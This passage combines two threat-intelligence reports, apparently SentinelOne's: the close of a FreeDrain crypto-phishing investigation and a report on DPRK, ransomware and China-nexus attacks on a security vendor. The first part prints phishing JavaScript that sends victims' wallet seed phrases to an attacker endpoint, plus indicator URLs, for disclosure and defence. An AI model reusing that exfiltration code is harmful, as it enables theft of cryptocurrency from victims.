actors.\nPhishing Pages\nAcross our monitoring, we observed dozens of variations in FreeDrain phishing pages but technically, they were all fairly simple and consistent in architecture.\nThese phishing pages were most often:\nHosted on cloud infrastructure, primarily Amazon S3 and Azure Web Apps\nDesigned to mimic legitimate cryptocurrency wallet interfaces (Trezor, MetaMask, Ledger, etc.)\nImplemented using HTML forms or AJAX POST requests to transmit stolen credentials to attacker-controlled endpoints\nA typical FreeDrain phishing page served from an S3 bucket, delivering only static content\nSome S3-hosted phishing sites sent harvested data to live backend services on Azure, as seen in multiple instances where form actions pointed to azurewebsites.net applications.\nThe form for an S3-hosted FreeDrain phishing page posts to “/send.php” running in Azure\nHuman Operators Behind the Scenes\nWhile most pages used standard static phishing techniques, we occasionally encountered live chat widgets embedded in Azure-hosted phishing pages.\nThis chat feature had previously been documented in a 2022 report by Netskope (one of the few references we ever found to FreeDrain and the earliest reported). Our own interactions confirmed that humans, not bots, were responding to victim inquiries in real time, often providing reassurance or technical “help” to keep targets engaged.\nLive chat interaction on a phishing page hosted in Azure\nClean, Unobfuscated Exfiltration Code\nIn the malicious JavaScript that we observed that handled POST requests with stolen seed phrases, the code is well-formatted, commented, and does not appear to be obfuscated in any way. Full examples are provided in the appendix, but a snippet of the POST request is below (domain bolded and defanged):\n\r\nconst data = {};\r\ninputs.forEach((input, index) => {\r\n    data[`phrase${index}`] = input.value.trim();\r\n});\r\ndata.subject = \"Trezor connect2\";\r\ndata.message = \"Successfull fetch data\";\r\n$.ajax({\r\n    type: \"POST\",\r\n    url: \"https://rfhwuwixxi.execute-api.us-east-1.amazonaws[.]com/prod/eappmail\",\r\n    dataType: \"json\",\r\n    crossDomain: true,\r\n    contentType: \"application/json; charset=utf-8\",\r\n    data: JSON.stringify(data),\r\n    success: function (result) {\r\n        alert('Data submitted successfully1!');\r\n        window.location.href = 'https://suite.trezor.io/web/';\r\n        location.reload();\r\n    },\r\n    error: function (xhr, status, error) {\r\n        window.location.href = 'https://suite.trezor.io/web/';\r\n \r\n \r\n}\r\n});\r\n\nDespite its simplicity, the phishing backend was effective, disposable, and often difficult to trace—highlighting just how low the bar is for technical sophistication when paired with wide-scale reach and persistent lure infrastructure.\nActor Analysis\nAttribution is inherently difficult when infrastructure is ephemeral and built on shared, free-tier services. Yet through a combination of repository metadata, behavioral signals, and timing artifacts, we were able to extract meaningful insights about FreeDrain’s operators, including likely location, working patterns, and their degree of operational coordination.\nOur first major breakthrough came from GitHub Pages (github.io), which only allows hosting via a public repository that matches the account’s GitHub username (e.g., username.github.io). This constraint meant every active FreeDrain lure page hosted on GitHub had a publicly accessible repository behind it.\nWe cloned hundreds of these repositories and analyzed the commit metadata, including timestamps, usernames, email addresses, and whether commits were made via the CLI or web interface. Several clear patterns emerged:\nEmail addresses were always unique, tied 1:1 with the GitHub account, and never reused.\nAll emails came from free providers like Gmail, Hotmail, Outlook, and ProtonMail.\nWhile naming styles varied widely (capitalization, numbers, patterns), we found clusters of similarly structured addresses, suggesting manual creation by multiple individuals, possibly using shared templates or naming approach.\nSample of email addresses found in FreeDrain-associated Github commit\nImportantly, GitHub commits preserve the local timezone of the user unless manually configured otherwise. In our dataset, over 99% of commits were timestamped in UTC+05:30 (Indian Standard Time), our first strong geographic indicator.\nOver 99% of the commits analyzed were localized to UTC+05:30\nWe corroborated this signal using metadata from other FreeDrain free-infrastructure/services. Webflow, for instance, embeds a “last published” timestamp in the HTML source of hosted sites. When we aggregated timestamps across the many FreeDrain Webflow pages, a clear 9-to-5 weekday work pattern emerged, complete with a consistent midday break. This pattern aligns closely with a standard business schedule in the IST timezone.\nAggregated Webflow publish times show an exceptionally clear weekday work pattern in UTC+05:30\nWebflow embeds publish timestamps into the HTML source code of published websites\nCombining these and other signals across platforms, we assess with high confidence that FreeDrain is operated by individuals based in the IST timezone, likely in India, working standard weekday hours.\nAdditionally, timeline analysis shows that FreeDrain has been active since at least 2022, with a notable acceleration in mid-2024. As of this writing, the campaign remains active across several free hosting and publishing platforms.\nConfirmed “last published” times, by date\nDisruption Efforts and Opportunities\nThe scale and diversity of services abused by FreeDrain made disruption an ongoing challenge. While the campaign leaned heavily on free-tier platforms, many of which allowed users to publish images, text, external links, and even custom JavaScript to subdomains under well-known parent domains, very few of these platforms offered streamlined abuse reporting workflows.\nIn most cases, there was no direct method to report malicious content from the content page itself, forcing us to manually investigate each platform’s policies, support forms, or contact channels. This adds unnecessary friction to the response process, especially when scaled across hundreds of active malicious pages.\nEven more concerning, most of the publishing platforms lacked the detection capabilities to identify this type of coordinated abuse on their own. The indicators were there: repetitive naming patterns, clustered behavior, identical templates reused across subdomains, but limited proactive action was being taken.\nThis highlights a broader industry need:\nFree-tier content platforms should invest in basic abuse prevention tooling and more accessible reporting mechanisms.\nAt minimum, this includes:\nAllowing abuse to be reported directly from published content pages\nMonitoring for patterns of misuse (e.g., bulk account creation, similar domain structures, repeated hosting of external phishing kits)\nEstablishing direct communication lines with trusted threat intel analysts and threat researchers\nFreeDrain’s reliance on free-tier platforms is not unique, and without better safeguards, these services will continue to be weaponized at scale.\nThis isn’t just a security issue, it’s a business one. When threat actors abuse these platforms to host phishing pages, fake login portals, or crypto scams, they erode user trust in the entire platform domain. Over time, this leads to real financial consequences:\nReputation damage: Reputable domain names like webflow.io, and teachable.com can quickly become flagged by corporate security tools, browser warning systems, and threat intelligence feeds. This reduces their utility for legitimate users and undermines the brand’s credibility.\nDeliverability and discoverability: Once a platform’s domain is associated with widespread abuse, search engines, email providers, and social networks may down-rank or block links from that domain, hurting all users, including paying customers.\nCustomer churn and support burden: Abuse-driven issues often result in a higher volume of customer support tickets, complaints, and refunds, particularly when paying users find their content mistakenly flagged or blocked due to a shared domain reputation.\nIncreased infrastructure and fraud costs: Hosting abusive content, even at scale on free tiers, still consumes compute, storage, and bandwidth. Worse, it may attract waves of automated account signups and resource abuse that raise operational costs.\nFailing to detect and mitigate this kind of abuse isn’t just a user risk– it’s an unpaid tax on the business, dragging down growth and trust at every layer. Proactive abuse prevention and streamlined reporting are not just table stakes for security, they’re critical to long-term sustainability.\nReferences and Similarities to Other Campaigns\nElements of the FreeDrain campaign were first publicly documented in August 2022 by Netskope, with a follow-up report in September 2022. Netskope’s early findings captured the core tactics that continue today: leveraging SEO manipulation to drive traffic to lure pages, which then redirect to credential-harvesting phishing sites. Netskope also published another update in October 2024, focusing on FreeDrain’s use of Webflow-hosted infrastructure, confirming the campaign’s continued evolution while retaining the same fundamental workflow.\nFreeDrain’s abuse of legitimate free-tier platforms is part of a broader trend in phishing infrastructure, but it remains distinct from other well-known crypto phishing efforts. For example, the CryptoCore campaign, reported by Avast in August 2024, similarly targets cryptocurrency users but relies heavily on YouTube content and impersonation videos to draw in victims, rather than search engine poisoning and static phishing sites.\nIn 2023, Trustwave reported on the use of Cloudflare’s pages.dev and workers.dev services in phishing, showing how modern hosting platforms that offer free, customizable subdomains with minimal friction are being systematically exploited, mirroring FreeDrain’s approach.\nRecent reporting has also shed light on the kinds of threat actors that may be behind campaigns like FreeDrain. Just this week, the U.S. Treasury sanctioned individuals linked to cyber scam operations in Southeast Asia, specifically a militia group in Burma involved in online fraud networks. While distinct from FreeDrain, these operations share similar hallmarks: large-scale abuse of online infrastructure, technical capability, and a focus on financial theft, demonstrating the scale and organization such campaigns can operate under.\nFreeDrain’s techniques have also been informally documented by affected users. In particular, Trezor hardware wallet customers have reported fraudulent websites mimicking the Trezor ecosystem, some of which were part of FreeDrain’s infrastructure:\nForum report: Reporting scam site\nForum discussion: Fake Trezor websites\nConclusion\nThe FreeDrain network represents a modern blueprint for scalable phishing operations, one that thrives on free-tier platforms, evades traditional abuse detection methods, and adapts rapidly to infrastructure takedowns. By abusing dozens of legitimate services to host content, distribute lure pages, and route victims, FreeDrain has built a resilient ecosystem that’s difficult to disrupt and easy to rebuild.\nThrough detailed infrastructure analysis, repository metadata mining, and cross-platform behavioral correlations, we uncovered rare insights into the actors behind the campaign, including strong indicators that the operation is manually run by a group based in the UTC+05:30 timezone, working standard business hours. Despite this visibility, systemic weaknesses in reporting mechanisms and abuse detection have allowed FreeDrain to persist and even accelerate in 2024.\nThis is not just a FreeDrain problem. The broader ecosystem of free publishing platforms is being exploited in ways that disproportionately benefit financially motivated threat actors. Without stronger default safeguards, identity verification, or abuse response infrastructure, these services will continue to be abused, undermining user trust and inflicting real-world financial harm.\nBy exposing the scale and structure of the FreeDrain network, we hope this research will enable better platform-level defenses, more informed user education, and collaboration across the security community to limit the reach and longevity of operations like this.\nIndicators of Compromise and Relations\nFull List of IOCs can be downloaded here.\nFreeDrain Lure Pages\nDownload Full List for over 40,000 URLs\nhttps://metamaskchromextan.gitbook\\.io/us\nFreeDrain Redirect Domains\nThese are the redirector domains we directly observed leveraged by FreeDrain going back 3+ years.\naffanytougees[.]com\nPhishing URLs\nhttps://atomicwallet.azurewebsites[.]net/\nExample JavaScript\nThis is an example of the JavaScript (“app.js”) that was included on the S3-hosted phishing example: https://dft0-hjgkd26-fkj.s3.us-east-1.amazonaws[.]com/index.html.\nNote the defanged malicious URL in the code below–that is the only alteration.\n\r\nlet currentWordCount = 12; // Default word count\r\nfunction updateInputFields(wordCount) {\r\n   const inputContainer = document.getElementById('inputContainer');\r\n   inputContainer.innerHTML = '';\r\n    currentWordCount = wordCount;\r\n    for (let i = 0; i < wordCount; i++) { // Use 0-based index for phase keys\r\n        const colDiv = document.createElement('div');\r\n    // if (wordCount === 1) {\r\n    //     colDiv.className = 'col-lg-21 col-md-12 col-sm-12 col-xs-12';\r\n    //     colDiv.innerHTML = `\r\n    //         <input\r\n    //             class=\"form-control\"\r\n    //             type=\"text\"\r\n    //             placeholder=\"Input your words as many words as you have\"\r\n    //             name=\"word${i}\"\r\n    //             required\r\n    //             title=\"Only alphabets are allowed.\">\r\n    //         <div class=\"error-message\" style=\"font-size:12px;color: #fe3131f2; display: none;\">Please enter a valid value.</div>\r\n    //     `;\r\n    // } else {\r\n        colDiv.className = 'col-lg-4 col-md-4 col-sm-4 col-xs-12';\r\n        colDiv.innerHTML = `\r\n            <input\r\n                class=\"form-control\"\r\n                type=\"text\"\r\n                placeholder=\"${i + 1}.\"\r\n                name=\"word${i}\"\r\n                required\r\n                pattern=\"[a-zA-Z]{1,10}\"\r\n                maxlength=\"10\"\r\n                oninput=\"this.value = this.value.replace(/[^a-zA-Z]/g, '').substring(0, 10);\"\r\n                title=\"Only alphabets are allowed.\">\r\n            <div class=\"error-message\" style=\"font-size:12px;color: #fe3131f2; display: none;\">Please enter a valid value.</div>\r\n                `;\r\n            // }\r\n        inputContainer.appendChild(colDiv);\r\n    }\r\n    event.target.classList.add('active');\r\n    const buttons = document.querySelectorAll('.displayflex button');\r\n    buttons.forEach((button) => {\r\n        button.classList.remove('active');\r\n    });\r\n    event.target.classList.add('active');\r\n}\r\nasync function handleNextStep(event) {\r\n    event.preventDefault();\r\n    const inputContainer = document.getElementById('inputContainer');\r\n    const inputs = inputContainer.querySelectorAll('input');\r\n    let allValid = true;\r\n    const enteredWords = new Set();\r\n    inputs.forEach((input) => {\r\n        const errorDiv = input.nextElementSibling; // Get the associated error div\r\n        if (!input.checkValidity()) {\r\n            errorDiv.style.display = 'block';\r\n            allValid = false;\r\n        } else {\r\n            errorDiv.style.display = 'none';\r\n        }\r\n        const word = input.value.trim().toLowerCase(); // Normalize to lowercase to handle case insensitivity\r\n        if (word && enteredWords.has(word)) {\r\n            allValid = false;\r\n            errorDiv.innerHTML = 'This word has already been entered.';\r\n            errorDiv.style.display = 'block';\r\n        } else {\r\n            enteredWords.add(word);  // Add word to the Set\r\n        }\r\n    });\r\n    if (!allValid) {\r\n        alert(\"Mnemonic phrase is not valid.

We don’t just study attacks, we experience them firsthand, levied against us. Our teams face the same threats we help others prepare for, and that proximity to the front lines shapes how we think, and how we operate. Real-world attacks against our own environment serve as constant pressure tests, reinforcing what works, revealing what doesn’t, and driving continuous improvement across our products and operations. When you’re a high-value target for some of the most capable and persistent adversaries out there, nothing less will do.</p>\n<p>Talking about being targeted is uncomfortable for any organization. For cybersecurity vendors, it&#8217;s practically taboo. But the truth is security vendors sit at an interesting cross-section of access, responsibility, and attacker ire that makes us prime targets for a variety of threat actors, and the stakes couldn’t be higher. When adversaries compromise a security company, they don’t just breach a single environment—they potentially gain insight into how thousands of environments and millions of endpoints are protected.</p>\n<p>In the past several months alone, we’ve observed and defended against a spectrum of attacks ranging from financially motivated crimeware to tailored campaigns by advanced nation-state actors. They were real intrusion attempts targeting a U.S.-based cybersecurity company — launched by adversaries actively looking for an advantage, access, or leverage. Adversaries included DPRK IT workers posing as job applicants, ransomware operators probing for ways to access/abuse our platform, and Chinese state-sponsored actors targeting organizations aligned with our business and customer base.</p>\n<p>We are certainly not the only ones facing these threats. In the spirit of furthering collective defenses and encouraging further collaboration, we’re pulling back the curtain to share some of what we’ve seen, why it matters, and what it tells us about the evolving threat landscape—not just for us, but for every company building and relying on modern security technology.</p>\n<h2>DPRK IT Workers Seeking Inside Jobs</h2>\n<p>One of the more prolific and persistent adversary campaigns we’ve tracked in recent years involves widespread campaigns by DPRK-affiliated IT Workers attempting to secure remote employment within Western tech companies– including SentinelOne. <a href=\"https://www.justice.gov/archives/opa/pr/fourteen-north-korean-nationals-indicted-carrying-out-multi-year-fraudulent-information\" target=\"_blank\" rel=\"noopener noreferrer\">Early reports</a> drew attention to these efforts and <a href=\"https://www.sentinelone.com/labs/dprk-it-workers-a-network-of-active-front-companies-and-their-links-to-china/\" target=\"_blank\" rel=\"noopener noreferrer\">our own analysis</a> revealed further logistical infrastructure to launder illicit funds via Chinese intermediary organizations. However, neither gave a sense of the staggering volume of ongoing infiltration attempts. This vector far outpaces any other insider threat vector we monitor.</p>\n<p>These actors are not just applying blindly — they are refining their process, leveraging stolen or fabricated personas, and adapting their outreach tactics to mirror legitimate job seekers in increasingly convincing ways. Our team has tracked roughly 360 fake personas and over 1,000 job applications linked to DPRK IT worker operations applying for roles at SentinelOne — even including brazen attempts to secure positions on the SentinelLabs intelligence engineering team itself.</p>\n<figure id=\"attachment_120051\" aria-describedby=\"caption-attachment-120051\" style=\"width: 588px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_1.jpg\" alt=\"Public reporting of DPRK IT workers applying to threat intelligence positions\" width=\"588\" height=\"723\" class=\"size-full wp-image-120051\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_1.jpg 588w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_1-244x300.jpg 244w\" sizes=\"auto, (max-width: 588px) 100vw, 588px\" /><figcaption id=\"caption-attachment-120051\" class=\"wp-caption-text\">Public reporting of DPRK IT workers applying to threat intelligence positions</figcaption></figure>\n<h3>Engagement and Adversary Interaction</h3>\n<p>Instead of staying passive, we made a deliberate choice towards intelligence-driven engagement. In coordination with our talent acquisition teams, we developed workflows to identify and interact with suspected DPRK applicants during the early phases of their outreach. This collaboration was key. By embedding lightweight vetting signals and monitoring directly into recruiting processes — without overburdening hiring teams — we were able to surface anomalous patterns tied to DPRK-affiliated personas piped directly into our Vertex Synapse intelligence platform for analyst review.</p>\n<p>Our attempted interactions offered rare insights into the craftiness and persistence of these infiltration campaigns — particularly the ways in which adversaries adapt to the friction they encounter.</p>\n<figure id=\"attachment_120055\" aria-describedby=\"caption-attachment-120055\" style=\"width: 1908px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6.jpg\" alt=\"Inbound DPRK referral request to strategic employees\" width=\"1908\" height=\"378\" class=\"size-full wp-image-120055\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6.jpg 1908w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-300x59.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-1024x203.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-768x152.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-1536x304.jpg 1536w\" sizes=\"auto, (max-width: 1908px) 100vw, 1908px\" /><figcaption id=\"caption-attachment-120055\" class=\"wp-caption-text\">Inbound DPRK referral request to strategic employees</figcaption></figure>\n<p>The attackers are honing their craft beyond the job application and recruitment process.

Rather than cluelessness, we encountered an intuitive understanding of the situation as recruiters had already been filtering out and reporting ‘fake applicants’ within their own processes.</p>\n<p>We brought campaign-level understanding that was combined with tactical insights from our talent team. The payoff was immediate. Recruiters began spotting patterns on their own, driving an increase in early-stage escalation of suspicious profiles. They became an active partner that continues to flag new sightings from the frontlines. In turn, we are codifying these insights into automated systems that flag, filter, enrich, and proactively block these campaigns to lower the burden on our recruiters and hiring managers, and reduce the risk of infiltration.</p>\n<p>Make cross‑functional collaboration standard operating procedure: equip frontline business units—from recruiting to sales—with shared threat context and clear escalation paths so they can surface anomalies early without slowing the business. Codifying insights with automation will consistently bring bi-directional benefits.</p>\n<p>The DPRK IT worker threat is a uniquely complex challenge — one where meaningful progress depends on collaboration between the security research community and public sector partners.</p>\n<h2>Ransomware Group Capability Development</h2>\n<p>Financially motivated threat actors frequently target enterprise security platforms —products designed to keep them from making money—for direct access. SentinelOne, like our peers, is no exception. While uncomfortable, this is a reality the industry faces continually and should handle with both transparency and urgency.</p>\n<figure id=\"attachment_120054\" aria-describedby=\"caption-attachment-120054\" style=\"width: 746px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_5.jpg\" alt=\"Forum post offering security product access\" width=\"746\" height=\"415\" class=\"size-full wp-image-120054\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_5.jpg 746w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_5-300x167.jpg 300w\" sizes=\"auto, (max-width: 746px) 100vw, 746px\" /><figcaption id=\"caption-attachment-120054\" class=\"wp-caption-text\">Forum post offering security product access</figcaption></figure>\n<p>Privileged access to administrative interfaces or agent installers for endpoint security products provides tangible advantages for adversaries seeking to advance their operations. Console access can be used to disable protections, manipulate configurations, or suppress detections. Direct, unmonitored access to the endpoint agent offers opportunities to test malware efficacy, explore bypass or tampering techniques, and suppress forensic visibility critical for investigations. In the wrong hands, these capabilities represent a significant threat to both the integrity of security products and the environments they protect.</p>\n<p>This isn’t a new tactic. Various high-profile criminal groups have long specialized in social engineering campaigns to gain access to core security tools and infrastructure—ranging from EDR platforms (including SentinelOne and Microsoft Defender) to IAM and VPN providers such as Okta. Their goal: expand footholds, disable defenses, and obstruct detection long enough to profit.</p>\n<p>Recent leaks related to <a href=\"https://www.sentinelone.com/anthology/black-basta/\" target=\"_blank\" rel=\"noopener noreferrer\">Black Basta</a> further underscore this trend. The group’s operators were observed testing across multiple endpoint security platforms—including SentinelOne, CrowdStrike, Carbon Black, and Palo Alto Networks—before launching attacks, suggesting a systematic effort to evaluate and evade security tools prior to deployment.</p>\n<figure id=\"attachment_120064\" aria-describedby=\"caption-attachment-120064\" style=\"width: 793px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2.jpg\" alt=\"Black Basta leak excerpts\" width=\"793\" height=\"328\" class=\"size-full wp-image-120064\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2.jpg 793w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2-300x124.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2-768x318.jpg 768w\" sizes=\"auto, (max-width: 793px) 100vw, 793px\" /><figcaption id=\"caption-attachment-120064\" class=\"wp-caption-text\">Black Basta leak excerpts</figcaption></figure>\n<h3>Economy/Ecosystem</h3>\n<p>There is an increasingly mature and active underground economy built around the buying, selling, and renting of access to enterprise security tools. For the right price, aspiring threat actors continually attempt to obtain time-bound or persistent access to our EDR platform and administrative consoles. Well-known cybercrime forums are filled with vendors openly advertising such access—and just as many buyers actively seeking it.

We first became aware of this threat cluster during a 2024 intrusion conducted against an organization previously providing hardware logistics services for SentinelOne employees. We refer to this cluster of activity as PurpleHaze, with technical overlaps to multiple publicly reported Chinese APTs.</p>\n<h3>The PurpleHaze Activity Cluster</h3>\n<p>Over the course of months, SentinelLABS observed the threat actor conduct many intrusions, including into a South Asian government supporting entity, providing IT solutions and infrastructure across multiple sectors. This activity involved extensive infrastructure, some of which we associate with an operational relay box (ORB) network, and a Windows backdoor that we track as GoReShell. The backdoor is implemented in the Go programming language and uses functionalities from the open-source <a href=\"https://github.com/NHAS/reverse_ssh\" target=\"_blank\" rel=\"noopener noreferrer\">reverse_ssh</a> tool to establish reverse SSH connections to attacker-controlled endpoints.</p>\n<p>SentinelLABS collectively tracks these activities under the PurpleHaze moniker. We assess with high confidence that PurpleHaze is a China-nexus actor, loosely linking it to APT15 (also known as Nylon Typhoon, or other various outdated aliases). This adversary is known for its global targeting of critical infrastructure sectors, such as telecommunications, information technology, and government organizations – victimology that aligns with our multiple encounters with PurpleHaze.</p>\n<p>We track the ORB network infrastructure observed in the attack against the South Asian government organization as being operated from China and actively used by several suspected Chinese cyberespionage actors, including APT15. The use of ORB networks is a <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks/\" target=\"_blank\" rel=\"noopener noreferrer\">growing</a> trend among these threat groups, since they can be rapidly expanded to create a dynamic and evolving infrastructure that makes tracking cyberespionage operations and their attribution challenging. Additionally, GoReShell malware and its variations, including the deployment mechanism on compromised machines and obfuscation techniques have been exclusively observed in intrusions that we attribute with high confidence to China-nexus actors.</p>\n<h3>ShadowPad Intrusions</h3>\n<p>In June 2024, approximately four months prior to PurpleHaze targeting SentinelOne, SentinelLABS observed threat actor activity targeting the same South Asian government entity that was also targeted in October 2024. Among the retrieved artifacts, we identified samples of <a href=\"https://www.sentinelone.com/labs/shadowpad-a-masterpiece-of-privately-sold-malware-in-chinese-espionage/\" target=\"_blank\" rel=\"noopener noreferrer\">ShadowPad</a>, a modular backdoor platform used by multiple suspected China-nexus threat actors to conduct cyberespionage. Recent ShadowPad <a href=\"https://www.trendmicro.com/en_us/research/25/b/updated-shadowpad-malware-leads-to-ransomware-deployment.html\" target=\"_blank\" rel=\"noopener noreferrer\">activity</a> has also included the deployment of ransomware, though the motive remains unclear — whether for financial gain or as a <a href=\"https://www.sentinelone.com/labs/chamelgang-attacking-critical-infrastructure-with-ransomware/\" target=\"_blank\" rel=\"noopener noreferrer\">means</a> of distraction, misattribution, or removal of evidence.</p>\n<p>The ShadowPad samples we retrieved were obfuscated using <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/scatterbrain-unmasking-poisonplug-obfuscator\" target=\"_blank\" rel=\"noopener noreferrer\">ScatterBrain</a>, an evolution of the <a href=\"https://www.pwc.co.uk/issues/cyber-security-services/insights/chasing-shadows.html\" target=\"_blank\" rel=\"noopener noreferrer\">ScatterBee</a> obfuscation mechanism. Our industry partner, Google Threat Intelligence Group (GTIG), have also observed the use of ScatterBrain-obfuscated ShadowPad samples since 2022 and attribute them to clusters associated with the suspected Chinese APT actor, APT41.</p>\n<figure id=\"attachment_120058\" aria-describedby=\"caption-attachment-120058\" style=\"width: 586px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_9.jpg\" alt=\"GTIG APT41 Use of ScatterBrain\" width=\"586\" height=\"117\" class=\"size-full wp-image-120058\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_9.jpg 586w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_9-300x60.jpg 300w\" sizes=\"auto, (max-width: 586px) 100vw, 586px\" /><figcaption id=\"caption-attachment-120058\" class=\"wp-caption-text\">GTIG APT41 Use of ScatterBrain</figcaption></figure>\n<p>Investigations continue in determining the specific actor overlap between June 2024 ShadowPad intrusions and the later PurpleHaze activity. We do not rule out the involvement of the same threat cluster, particularly given the extensive sharing of malware, infrastructure, and operational practices among Chinese threat groups, as well as the possibility of access transfer between different actors.</p>\n<p>Based on private telemetry, we identified a large collection of victim organizations compromised using ScatterBrain-obfuscated ShadowPad. Between July 2024 and March 2025, this malware was used in intrusions at over 70 organizations across various regions globally, spanning sectors such as manufacturing, government, finance, telecommunications, and research. We assess that the threat actor primarily gained initial foothold in the majority of these organizations by exploiting an n-day vulnerability in CheckPoint gateway devices, which aligns with <a href=\"https://www.orangecyberdefense.com/global/blog/cert-news/meet-nailaolocker-a-ransomware-distributed-in-europe-by-shadowpad-and-plugx-backdoors\" target=\"_blank\" rel=\"noopener noreferrer\">previous research</a> on ShadowPad intrusions involving the deployment of ransomware.</p>\n<p>Among the victims, we identified the previously mentioned IT services and logistics organization that was at the time responsible for managing hardware logistics for SentinelOne employees. Victim organizations were promptly informed of intrusion specifics, which were swiftly investigated. At this point, it remains unclear whether the perpetrators&#8217; focus was solely on the compromised organization or if they intended to extend their reach to client organizations as well.</p>\n<p>A detailed investigation into SentinelOne&#8217;s infrastructure, software, and hardware assets found no evidence of secondary compromise. Nevertheless, this case underscores the fragility of the larger supplier ecosystem that organizations depend upon and the persistent threat posed by suspected Chinese threat actors, who continuously seek to establish <a href=\"https://www.sentinelone.com/labs/operation-digital-eye-chinese-apt-compromises-critical-digital-infrastructure-via-visual-studio-code-tunnels/\" target=\"_blank\" rel=\"noopener noreferrer\">strategic footholds</a> to potentially compromise downstream entities.</p>\n<p>SentinelLABS will share a detailed public release on this topic in due course, providing further technical information on these activities, including observed TTPs, malware, and infrastructure.</p>\n<h3>Lessons Learned While Hardening Our Operational Ecosystem</h3>\n<p>Our analysis of the PurpleHaze cluster, and more specifically the potential indirect risk introduced via compromised third-party service providers, has reinforced several key insights around operational security and supply chain monitoring. Even when our own infrastructure remained untouched, the targeting of an external service provider previously associated with business logistics surfaced important considerations.</p>\n<p>One immediate reminder is the necessity of maintaining real-time awareness not only over internal assets but also over adjacent service providers—particularly those with past or current access to sensitive employee devices or logistical information. When incidents occur near your supply chain, don’t wait for confirmation of compromise. Proactively trigger internal reviews of asset inventories, procurement workflows, OS images and onboarding deployment scripts, and segmentation policies to quickly identify any exposure pathways and reduce downstream risk.</p>\n<p>This leads to several defense recommendations:</p>\n<ul>\n<li aria-level=\"1\"><strong>Distribute Threat Intelligence Across Operational Stakeholders</strong><br />\nOrganizations should proactively share campaign-level threat intelligence with business units beyond the traditional security org—particularly those managing vendor relationships, logistics, and physical operations. Doing so enables faster detection of overlap with compromised third parties and supports early reassessment of exposure through external partners.</li>\n<li aria-level=\"1\"><strong>Integrate Threat Context Into Asset Attribution Workflows</strong><br />\nInfrastructure and IT teams should collaborate with threat intelligence functions to embed threat-aware metadata into asset inventories. This enables more responsive scoping during incident response and enhances the ability to trace supply chain touchpoints that may be at risk.</li>\n<li aria-level=\"1\"><strong>Expand Supply Chain Threat Modeling</strong><br />\nOrganizations should refine their threat modeling processes to explicitly account for upstream supply chain threats, especially those posed by nation-state actors with a history of leveraging contractors, vendors, or logistics partners as indirect access vectors. Tailoring models to include adversary-specific tradecraft enables earlier identification of unconventional intrusion pathways.</li>\n</ul>\n<p>While attribution continues to evolve and victim impact remains diverse, one thing is clear: well-resourced threat actors are increasingly leaning on indirect routes into enterprise environments. Investigations like this help us sharpen our defenses—not just around traditional digital perimeters but around the full operational footprint of our organization.</p>\n<h2>The Strategic Value of Cyber Threat Intelligence</h2>\n<p>In today’s threat landscape, threat intelligence has evolved from a niche function into an essential pillar of enterprise defense—particularly for private sector organizations operating in the security space. As threat actors increasingly target security vendors for insider access, abuse of legitimate channels, and supply chain infiltration, the role of CTI in anticipating and disrupting these tactics has become more critical than ever.</p>\n<p>One of the most tangible examples of this value is in internal talent acquisition and insider threat defense. Intelligence has become a frontline asset in identifying attempts by North Korean IT workers and other state-backed operatives to embed themselves in organizations under false pretenses. By flagging suspicious applicant patterns, cross-referencing alias histories, and tracking known tradecraft, CTI teams help hiring managers and HR avoid potential insider incidents before they start.</p>\n<p>Our CTI capabilities must also directly support sales and channel operations. As criminal groups increasingly impersonate legitimate businesses to acquire security products through trusted resellers, intelligence plays a key role in verifying customer legitimacy and identifying anomalous purchase behaviors. By integrating intelligence insights into pre-sale vetting workflows, a crucial layer of protection is helping to ensure adversaries cannot simply “buy” their way into our technology stack.</p>\n<p>Internally, threat intelligence informs and enhances how we defend our own technology and supply chain against highly targeted APT activity. From understanding how adversaries reverse-engineer our software to uncovering which parts of our technology stack they seek to compromise, CTI enables proactive hardening, smarter telemetry prioritization, and meaningful collaboration with product and engineering teams. In essence, intelligence acts as an early-warning system and a strategic guide—ensuring our defenses stay one step ahead of evolving threats.</p>\n<p>Across every function—whether it&#8217;s HR, Sales, Engineering, or Security—cyber threat intelligence is no longer a backroom function. It&#8217;s embedded in the fabric of how we defend, operate, and grow as a business.</p>\n","content:encodedSnippet":"Executive Summary\nIn recent months, SentinelOne has observed and defended against a spectrum of attacks from financially motivated crimeware to tailored campaigns by advanced nation-state actors.\nThese incidents were real intrusion attempts against a U.S.-based cybersecurity company by adversaries, but incidents such as these are neither new nor unique to SentinelOne.\nRecent adversaries have included:\n\nDPRK IT workers posing as job applicants\nransomware operators probing for ways to access/abuse our platform\nChinese state-sponsored actors targeting organizations aligned with our business and customer base\nThis report highlights a rarely-discussed but crucially important attack surface: security vendors themselves.\nOverview\nAt SentinelOne, defending against real-world threats isn’t just part of the job, it’s the reality of 